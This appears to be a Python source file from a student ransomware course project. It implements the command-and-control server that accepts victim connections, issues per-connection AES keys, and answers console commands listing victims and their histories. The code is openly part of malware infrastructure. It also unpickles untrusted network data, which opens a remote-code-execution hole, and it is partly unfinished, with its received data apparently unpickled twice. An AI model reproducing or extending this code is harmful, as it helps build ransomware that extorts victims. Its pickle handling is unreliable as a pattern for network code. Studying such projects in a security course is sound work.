#!/usr/bin/python
# --------------------------------------------
import binascii
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import threading
from _thread import start_new_thread

import configgetter as config
import security
import queue
import utile.data as udata
import message
import pickle

# --------------------------------------------
# Classes & Functions
# --------------------------------------------

print_lock = threading.Lock()
q1 = queue.Queue()
clients = {}

class server_tcp(object):


    def __init__(self, ip, port, port2):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port
        self.port2 = port2

    def send_data(self, c, message, HEADERSIZE=10):
        """
        Créer un header pour la connexion TCP afin de savoir de où à où lire
        """
        serialized_payload = pickle.dumps(message)
        c.sendall(bytes(f"{len(serialized_payload):<{HEADERSIZE}}", 'utf-8'))
        c.sendall(serialized_payload)

    def receive_data(self, c, HEADERSIZE=10):
        data_size = c.recv(HEADERSIZE)
        if not data_size:
            return None
        data_size = int(float(data_size))
        received_payload = b""
        reamining_payload_size = data_size
        while reamining_payload_size != 0:
            received_payload += c.recv(reamining_payload_size)
            reamining_payload_size = data_size - len(received_payload)
        payload = pickle.loads(received_payload)
        return payload


    def accept_con(self, conn):
        connexion, addr = conn.accept()
        q1.put(connexion)

    def start_server(self):
        """
        Démarrage du serveur et maintient de celui-ci + gestion des 'commandes'
        """
        # Création de la socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
            s2.bind((self.ip, self.port2))
        except socket.error as error:
            print(str(error))
        s.listen(10)
        s2.listen(10)
        while True:
            # On accepte les connexions
            t1 = threading.Thread(target=self.accept_con, args=(s,))
            t2 = threading.Thread(target=self.accept_con, args=(s2,))
            t1.start()
            t2.start()
            conn = q1.get()
            addr = conn.getpeername()
            clients[addr] = conn
            print(f'[+] {str(addr[0])}:{str(addr[1])}')
            # Nouvelle connexion détectée : On créé un thread pour celle-ci
            client_thread = threading.Thread(target=self.threaded, args=(conn, addr))
            client_thread.start()
            #start_new_thread(self.threaded, (conn, addr))
        # Fermeture de la connexion
        s.close()
        s2.close()

    def gestion_msg(self, c, msg):
        """
        Système de gestion des commandes envoyées par la console de contrôle
        """
        if msg == message.list_victim_req():
            # On va interroger le serveur SQL depuis le serveur frontale pour des raisons
            # De sécurité...
            # On envoie la liste
            return udata.list_victim()
        elif "HIST_REQ" in msg:
            # On demande un ID en particulier pour une recherche d'historique
            # On envoie l'historique
            return udata.history_req(msg[-3:-2])
        elif msg == '3':
            # C'est à faire
            return "Todo3"
        elif msg == message.close_connexion():
            return 'Thanks you, good bye.'

    def threaded(self, c, sc):
        """
        Système de création de Threads..
        """
        print('[FiFo] Implemented')
        print('New thread started')
        print('[SecurityLayerAES]Generating Security Parameters...')
        # On initialise un protocole de sécurité AES par thread pour
        # Sécurisé de manière différente (différents nonce, key, authtag)
        # chaques connexion pour éviter de pouvoir spoof sur une autre connexion
        # tcp avec des keys d'autres connexions...
        sec_key = security.gen_key(16)
        self.send_data(c, sec_key)
        #c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
        # Todo: Mettre en place le cryptage
        while True:
            data = self.receive_data(c)
            if data == b'' or data is None:
                print(sc[0] + ':' + str(sc[1]) + ' >> connexion closed.')
                # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                break
            cryptMsg = pickle.loads(data)
            clearMsg = security.decrypt(cryptMsg, sec_key)
            # On print l'ip de la connexion et sa demande
            print(str(sc[0] + ':' + str(sc[1]) + " >> " + str(clearMsg)))
            # On construit une réponse grâce à la méthode gestion message
            rs = self.gestion_msg(c, clearMsg)
            r = security.crypt(rs, sec_key)
            payload = pickle.dumps(r)
            # @Todo: Build header & send it before msg
            # On l'envoie
            self.send_data(c, payload)
        # On ferme la connexion du client lors de la fin de connexion
        c.close()
        clients.pop(sc)


# On initialise l'objet serveur avec les paramètres ip et port contenu dans le fichier config
# Pour éviter le hard-coding et des modifications plus aisée...
srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"), config.get_specific_data("../config.json", "second_port_server"))
# On démarre le serveur
srv.start_server()
